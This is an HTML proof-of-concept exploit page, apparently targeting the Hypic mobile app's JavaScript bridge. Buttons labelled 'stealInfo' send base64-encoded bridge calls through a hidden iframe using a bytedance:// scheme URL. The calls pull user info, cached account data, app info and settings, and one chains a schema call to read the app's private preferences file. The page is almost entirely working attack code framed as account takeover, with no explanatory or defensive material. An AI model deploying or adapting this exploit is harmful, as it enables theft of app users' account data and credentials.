<!DOCTYPE html>
<html>
<head>
    <title>Hypic JSB ATO PoC</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: sans-serif; padding: 20px; }
        #output { background: #f4f4f4; padding: 10px; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; }
        button { padding: 15px 20px; font-size: 16px; background: #ff3b30; color: white; border: none; border-radius: 5px; cursor: pointer; margin-bottom: 10px;}
    </style>
</head>
<body>
    <h1>Hypic Bridge Pwn</h1>
    
    <button onclick="stealInfo('getUserInfo')">1. stealInfo('getUserInfo')</button>

    <button onclick="stealInfo('getAccountInfoCache')">2. stealInfo('getAccountInfoCache')</button>

    <button onclick="stealInfo('getAppInfo')">3. stealInfo('getAppInfo')</button>

    <button onclick="stealInfo('getSettings')">4. stealInfo('getSettings')</button>

    <button onclick="stealInfo('openSchema', {'schema': 'retouchoversea://picture_edit?picture_path=file:///data/data/com.xt.retouchoversea/shared_prefs/com.xt.retouchoversea_preferences.xml'})">5. Chained LFD exploit</button>
    
    <h3>Extracted Data:</h3>
    <pre id="output">Waiting...</pre>

    <script>
        function log(msg) {
            var out = document.getElementById('output');
            if (out.innerText === "Waiting...") out.innerText = "";
            out.innerText += msg + "\n\n";
        }

        // Setup global callbacks for the app to respond to
        window.JSBridge = { 
            _handleMessageFromApp: function(msg) { log("[JSBridge] Received:\n" + JSON.stringify(msg, null, 2)); } 
        };
        window.Native2JSBridge = { 
            _handleMessageFromApp: function(msg) { log("[Native2JSBridge] Received:\n" + JSON.stringify(msg, null, 2)); } 
        };
        window.ToutiaoJSBridge = { 
            _handleMessageFromToutiao: function(msg) { log("[ToutiaoJSBridge] Received:\n" + JSON.stringify(msg, null, 2)); } 
        };
        window._handleMessageFromApp = function(msg) { log("[Global] Received:\n" + JSON.stringify(msg, null, 2)); };

        function stealInfo(funcName, params = {}) {
            log("--- Triggering " + funcName + " ---");
            
            var payload = [{
                "__msg_type": "call",
                "func": funcName,
                "params": params,
                "JSSDK": "1",
                "__callback_id": "pwn_" + funcName
            }];

            var jsonStr = JSON.stringify(payload);
            var b64Payload = btoa(unescape(encodeURIComponent(jsonStr)));
            var schemaUrl = "bytedance://private/setresult/SCENE_FETCHQUEUE&" + b64Payload;
            
            var iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = schemaUrl;
            document.body.appendChild(iframe);
            setTimeout(function() { iframe.remove(); }, 500);
        }
    </script>
</body>
</html>
